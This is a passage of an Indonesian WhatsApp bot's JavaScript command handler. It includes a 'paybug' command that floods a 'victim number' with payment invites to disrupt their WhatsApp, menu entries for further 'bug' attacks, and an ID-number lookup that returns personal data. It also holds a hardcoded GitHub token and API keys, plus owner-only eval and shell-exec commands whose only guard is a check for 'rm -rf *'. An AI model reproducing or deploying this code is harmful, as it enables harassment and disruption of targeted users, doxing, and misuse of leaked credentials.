  if (!text) return fbutton(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  var number = text.split(',')[0];
  var amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return fbutton(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return fbutton("Amount must be a number");
  }
  if (text.includes(global.TargetOwner)) {
  fbutton("Itu owner gua mau lu apain?")
  } else fbutton("please wait, " + command + " bug is in process..");
  var cleanedNumber = number.replace(/[^0-9]/g, '');
  var encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Fizzxy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  var whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
  }
  if (contactInfo.length == 0) {
    return fbutton("Nomor belum di register ke WhatsApp");
  }
 
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case "uploadgh": case "repogit": {
if (!text) return fbutton("Nama repo nya apa?") 
const username = 'VaniaaaSensei'
const password = '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'
let repo = `${text}`
const repoUrl = `github.com/${username}/${repo}.git`

const execute = (command) => {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(`Error: ${error.message}`)
        return
      }
      if (stderr) {
        console.warn(`Stderr: ${stderr}`)
      }
      resolve(stdout)
    })
  })
}

const push = async () => {
  try {
    await execute('git add ..')
    console.log(await execute('git commit -m "zh"'))
    console.log(await execute('git branch -M master'))
    console.log(await execute(`git push https://${username}:${password}@${repoUrl} master --force`))
    console.log('Update successfully')
    fbutton('Update successfully')
  } catch (error) {
    console.error(`Failed to update: ${error}`)
    fbutton(`Failed to update: ${error}`)
  }
}

push()
} break

case'ceknik':{
if (!text) return m.reply(`*Example:* ${prefix + command} Nik KTP`)
try {
let telaso = await fetchJson(`https://api.kyuurzy.site/api/search/ceknik?query=${text}`)
Fizzxy.sendMessage(m.chat, { text: `Status: *${telaso.result.status}*\nPesan : ${telaso.result.pesan}\n\nNik : *${telaso.result.data.nik}*\nKelamin : *${telaso.result.data.kelamin}*\nLahir : *${telaso.result.data.lahir}*\nProvinsi : *${telaso.result.data.provinsi}*\nKota/Kabupaten : *${telaso.result.data.kotakab}*\nKecamatan : *${telaso.result.data.kecamatan}*\nUniqcode : *${telaso.result.data.uniqcode}*\nKodepos : *${telaso.result.data.tambahan.kodepos}*\nPasaran : *${telaso.result.data.tambahan.pasaran}*\nUmur : *${telaso.result.data.tambahan.usia}*\nUltah : *${telaso.result.data.tambahan.ultah}*\nZodiak : *${telaso.result.data.tambahan.zodiak}*\n\n*Check Nik KTP (Not a Doxing Feature!!!*)`},{quoted:m})
} catch {
const e = "Status: false\nPesan: Nik tidak valid"
Fizzxy.sendMessage(m.chat, {text: e}, {quoted: m}) 
}
}
break

case 'backup': {
if (!isCreator) return fbutton('Fitur Khusus Owner!'); 
 const ls = (await execSync("ls")).toString().split("\n").filter( (pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "" );
await fbutton('Script Sedang di Convert to zip')
const exec = await execSync(`zip -r Backup.zip ${ls.join(" ")}`);
await Fizzxy.sendMessage("6285172200670@s.whatsapp.net", {
document: await fs.readFileSync("./Backup.zip"),
mimetype: "application/zip",
fileName: "Backup.zip",
},
{quoted: m });
await sleep(500) 
fbutton("Script sudah di kirim melalui private chat ! ") 
await execSync("rm -rf Backup.zip");
}
break
case 'clearsesi': case 'delsesi':{
if (!isCreator) return fbutton("Khusus Fizzxy Ganteng 😉") 
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return fbutton('Unable to scan directory: ' + err);
}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-")
)
console.log(filteredArray.length);
let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
if(filteredArray.length == 0) return setReply(teks)
fbutton(teks)
await sleep(2000)
fbutton("Menghapus file sampah session")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
fbutton("Berhasil menghapus semua sampah di folder session")
});

}
break
case  'listvn':{
 let teksooo = ' *LIST VN*\n\n'
for (let x of vnnye) {
teksooo += `⭔${x}\n`
}
fbutton(teksooo)
}
break
case 'delvn':{
if (!isCreator) return fbutton("Akses di tolak kamu bukan ownerku ")
if (args.length < 1) return fbutton('Masukan query')
if (!vnnye.includes(text)) return fbutton("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./all/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./Database/${text}.mp3`)
fbutton(`Sukses delete vn ${text}`)
}
break
case 'addvn':{
if (!isCreator) return fbutton("Akses di tolak kamu bukan ownerku ")
if (args.length < 1) return reply('Nama lagu?')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await Fizzxy.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./database/${text}.mp3`)
fs.writeFileSync('./all/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
fbutton(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break

case 'listapikey': case 'apikey': {
if (!isCreator) return fbutton("Akses di tolak kamu bukan ownerku ")
var apikeyy = `\`APIKEY Fizzxy Dev\`

_Website_ : https://api.elxyz.me/
_Apikey_ : FreeBotz

_Website_ : https://ai.xterm.codes/
_Apikey_ : FizzxyTampan
`
await Fizzxy.sendMessage(m.chat, 
{
text: apikeyy, 
contextInfo: {
isForwarded: true,
mentionedJid: [sender]
}
}, 
{quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `Device : ${getDevice(m.key.id)}`}} }) 
} break

case 'ping': case 'botstatus': case 'statusbot': {
            const used = process.memoryUsage()
            const cpus = os.cpus().map(cpu => {
                cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
          return cpu
            })
            const cpu = cpus.reduce((last, cpu, _, { length }) => {
                last.total += cpu.total
                last.speed += cpu.speed / length
                last.times.user += cpu.times.user
                last.times.nice += cpu.times.nice
                last.times.sys += cpu.times.sys
                last.times.idle += cpu.times.idle
                last.times.irq += cpu.times.irq
                return last
            }, {
                speed: 0,
                total: 0,
                times: {
              user: 0,
              nice: 0,
              sys: 0,
              idle: 0,
              irq: 0
            }
            })
            let timestamp = speed()
            let latensi = speed() - timestamp
            neww = performance.now()
            oldd = performance.now()
            respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
            `.trim()
            await Fizzxy.sendMessage(m.chat, 
{
text: respon, 
contextInfo: {
isForwarded: true,
mentionedJid: [sender]
}
}, 
{quoted: m}) 
        }
        break;

case 'cekcase': {
if (!isCreator) return fbutton("Akses di tolak kamu bukan ownerku ")
if (!text) return m.reply(`Contoh: ${prefix+command} caseName`);
const caseName = text.trim();
if (!caseName) return m.reply(`Masukkan nama case yang ingin dicek. Contoh: ${prefix+command} caseName`);
const cekCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./case.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return { found: false };
}
const lines = fileContent.split('\n');
const caseLines = match[0].split('\n');
const startLine = lines.indexOf(caseLines[0]) + 1;
const endLine = startLine + caseLines.length - 1;
return {
found: true,
startLine,
endLine,
content: match[0]
};
} catch (error) {
return { error: `Terjadi kesalahan saat membaca file: ${error.message}` };
}};
const result = await cekCase(caseName);
if (result.error) {
m.reply(result.error);
} else if (result.found) {
const message = `
*CASE DITEMUKAN!*
• Nama Case: \`${caseName}\`
• Baris Awal: ${result.startLine}
• Baris Akhir: ${result.endLine}`;
await Fizzxy.sendMessage(m.chat, 
{
text: message, 
contextInfo: {
isForwarded: true,
mentionedJid: [sender]
}
}, 
{quoted: m}) 
} else {
m.reply(`Case '${caseName}' tidak ditemukan.`);
}
}
break;

case 'cekfunc':
case 'cekfunction': {
if (!isCreator) return fbutton("Akses di tolak kamu bukan ownerku ")
if (!text) return m.reply(`Contoh: ${prefix+command} functionName`);
const functionName = text.trim();
if (!functionName) return m.reply(`Masukkan nama function yang ingin dicek. Contoh: ${prefix+command} functionName`);
const cekFunction = async (functionName) => {
try {
const fileContent = await fs.promises.readFile("./case.js", "utf-8");
const functionRegex = new RegExp(`function ${functionName}\\s*\\([\\s\\S]*?\\)\\s*\\{[\\s\\S]*?\\}`, 'g');
const match = fileContent.match(functionRegex);
if (!match) {
return { found: false };
}
const lines = fileContent.split('\n');
const functionLines = match[0].split('\n');
const startLine = lines.indexOf(functionLines[0]) + 1;
const endLine = startLine + functionLines.length - 1;
return {
found: true,
startLine,
endLine,
content: match[0]
};
} catch (error) {
return { error: `Terjadi kesalahan saat membaca file: ${error.message}` };
}};
const result = await cekFunction(functionName);
if (result.error) {
m.reply(result.error);
} else if (result.found) {
const message = `
*FUNCTION DITEMUKAN!*
• Nama funct: ${functionName}
• Baris awal: ${result.startLine}
• Baris akhir: ${result.endLine}`;
await Fizzxy.sendMessage(m.chat, 
{
text: message, 
contextInfo: {
isForwarded: true,
mentionedJid: [sender]
}
}, 
{quoted: m}) 
} else {
m.reply(`Function '${functionName}' tidak ditemukan.`);
}
}
break;

case "fizz": case "menu": {
var no = 1
var aa = `_*Hay @${sender.split("@")[0]} ${ucapin}*_

*\`[ USER INFO ]\`*
_Name : ${pushname}_
_Number :_ ${sender.split("@")[0]}
_Device : ${getDevice(m.key.id)}_`

const bb = `
_Feature Bug :_
${no ++}. Bugfc
${no ++}. Paybug

_Feature Github :_
${no ++}. Uploadgh
${no ++}. Backup

_Feature Owner :_
${no ++}. Clearsesi
${no ++}. Public
${no ++}. Self
${no ++}. Addvn
${no ++}. Delvn
${no ++}. Listvn
${no ++}. Apikey

_Feature Eval :_
${no ++}. <
${no ++}. $
`
const reps = {
display_text: "Cadangkan Script",
id:`backup`, 
}
sendButtonContexInfo(aa, bb, [m.sender], reps) 
} break

default:

if (budy.startsWith("<")) {
if (!isCreator) return fbutton("Akses di tolak kamu bukan ownerku ")
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
fbutton(evaled)
} catch (err) {
fbutton(String(err))
}
}
global.Warning = "rm -rf *"
if (budy.startsWith("$")) {
if (!isCreator) return fbutton("Akses di tolak kamu bukan ownerku ")
if (text.includes(global.Warning)) {
  fbutton("Lu mau hapus script gua? 😂")
  } else exec(q, async (err, stdout) => {
if (err) return sendButton(`System Console:\n\n${err}`)
if (stdout) {
await sendButton(`${a}>_ Console${a}\n\n${stdout}`)
}
})
}

let mention = m.message[m.mtype]?.contextInfo?.mentionedJid?.length > 0
        ? m.message[m.mtype].contextInfo.mentionedJid
        : m.message[m.mtype]?.contextInfo?.participant
            ? [m.message[m.mtype].contextInfo.participant]
            : [];
const isBotMention = mention.includes(botNumber);
let isBaileys = m.key.id?.startsWith('BAE5') && m.key.id?.length === 16

if (!isBotMention) return
/*async function transcribe(buffer) {
  try {
    let response = await fetch(`${api.xterm.url}/api/audioProcessing/transcribe?key=${api.xterm.key}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/octet-stream'
      },
      body: buffer
    })
    let result = await response.json()
    return result
  } catch (error) {
    console.error('Error uploading audio buffer:', error)
    return "gagal!"
  }
}*/
async function transcribe(url, buffer) {
  try {
    let response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/octet-stream'
      },
      body: buffer
    })
    let result = await response.json()
    return result
  } catch (error) {
    console.error('Error uploading audio buffer:', error)
    return "gagal!"
  }
}

   if (isAudio) {
   console.log("Audio true")
   try {
budy = (await transcribe(`https://ai.xterm.codes/api/audioProcessing/transcribe?key=FizzxyTampan`, await m.download() )).data.text
 } catch {
 budy = console.log({ resbudy: budy })
 }
   }
   console.log({ resbudy: budy })
   let body = { text: `${budy}`, id: `${sender}` , fullainame: `Zahraa`, nickainame: `Zahra Rahmadina`, senderName: `${pushname}` , ownerName: "Fizzxy Dev", date: new Date(), role: `Pacar` }
   
let res = await fetch(`${api.xterm.url}/api/chat/logic-bell?key=Bell409`, {
method: 'POST',
headers: {
'Content-Type': 'application/json'
      },
      body: JSON.stringify(body)
    })
   var { data } = await res.json()
   if (data?.msg && data?.cmd !== "voice") await Fizzxy.sendMessage(m.chat, 
{
text: data.msg, 
contextInfo: {
isForwarded: true,
mentionedJid: [sender]
}
}, 
{quoted: m})
   
if(data?.cmd){
        switch(data.cmd){
            case 'ytm4a':
let urll = await  fetch("https://rifza.me/api/youtube/search?query="+data.cfg.url).then(async a => (await a.json())[0].url)
let gambarku = await  fetch("https://rifza.me/api/youtube/search?query="+data.cfg.url).then(async a => (await a.json())[0].image)
ytdlnew(`${urll}`).then(res => {
 console.log(res)
Fizzxy.sendMessage(m.chat, {audio: {url: res.mp3DownloadLink }, mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "6285172200670@s.whatsapp.net" 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Fizzxy Terverifikasi Whatsapp`,
newsletterJid: "120363265749564412@newsletter"}
}},{quoted: m })
}) 
            break
            case 'voice': {
            try {
let pissyy = "https://telegra.ph/file/235e23ec4c179d545619b.jpg"
await Fizzxy.sendMessage(m.chat, { audio: { url: `https://ai.xterm.codes/api/text2speech/bella?key=Bell409&text=${data.msg}`}, mimetype: "audio/mpeg", ptt: true}, { quoted: m })
} catch (e) {
m.reply(e) 
}
} break
            case 'public':
if (!isCreator) return fbutton("Khusus Fizzxy Ganteng 😉") 
Fizzxy.public = true
fbutton("Done") 
break
case 'self':
if (!isCreator) return fbutton("Khusus Fizzxy Ganteng 😉") 
Fizzxy.public = false
fbutton("Done") 
break

case "menu": {
var no = 1
var aa = `_*Hay @${sender.split("@")[0]} ${ucapin}*_

*\`[ USER INFO ]\`*
_Name : ${pushname}_
_Number :_ ${sender.split("@")[0]}
_Device : ${getDevice(m.key.id)}_`

const bb = `
_Feature Bug :_
${no ++}. Bugfc
${no ++}. Paybug

_Feature Github :_
${no ++}. Uploadgh
${no ++}. Backup

_Feature Owner :_
${no ++}. Clearsesi
${no ++}. Public
${no ++}. Self
${no ++}. Addvn
${no ++}. Delvn
${no ++}. Listvn
${no ++}. Apikey

_Feature Eval :_
${no ++}. <
${no ++}. $
`
const reps = {
display_text: "Cadangkan Script",
id:`backup`, 
}
sendButtonContexInfo(aa, bb, [m.sender], reps) 
} break
            
            }
            }
   
   
   
   
   

}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
